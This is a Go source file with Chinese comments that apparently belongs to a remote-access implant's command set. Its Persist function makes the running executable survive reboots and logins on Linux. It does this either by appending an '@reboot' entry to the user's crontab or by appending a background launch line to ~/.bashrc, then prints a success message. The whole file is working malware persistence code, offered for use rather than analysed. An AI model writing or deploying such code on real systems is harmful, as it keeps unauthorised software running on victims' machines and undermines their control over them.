//go:build linux

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Persist 在 Linux 上植入持久化。technique 格式: "方法"，方法支持 cron|bashrc。
//   cron:   crontab 追加 @reboot <exe>
//   bashrc: ~/.bashrc 追加 <exe> &
func Persist(technique string) ([]byte, error) {
	exe, err := os.Executable()
	if err != nil {
		return nil, err
	}
	parts := strings.Fields(technique)
	method := ""
	if len(parts) > 0 {
		method = parts[0]
	}

	switch method {
	case "cron":
		cur, _ := exec.Command("crontab", "-l").Output()
		newCrontab := string(cur) + fmt.Sprintf("@reboot %s\n", exe)
		cmd := exec.Command("crontab", "-")
		cmd.Stdin = strings.NewReader(newCrontab)
		if out, err := cmd.CombinedOutput(); err != nil {
			return nil, fmt.Errorf("cron persist 失败: %v: %s", err, out)
		}
		return []byte(fmt.Sprintf("✅ cron 持久化成功: @reboot %s", exe)), nil
	case "bashrc":
		home, err := os.UserHomeDir()
		if err != nil {
			return nil, err
		}
		f, err := os.OpenFile(filepath.Join(home, ".bashrc"), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			return nil, err
		}
		defer f.Close()
		if _, err := f.WriteString(fmt.Sprintf("\n%s &\n", exe)); err != nil {
			return nil, err
		}
		return []byte(fmt.Sprintf("✅ bashrc 持久化成功: %s", filepath.Join(home, ".bashrc"))), nil
	default:
		return nil, fmt.Errorf("不支持的 Linux 持久化方法: %s（可用 cron|bashrc）", method)
	}
}
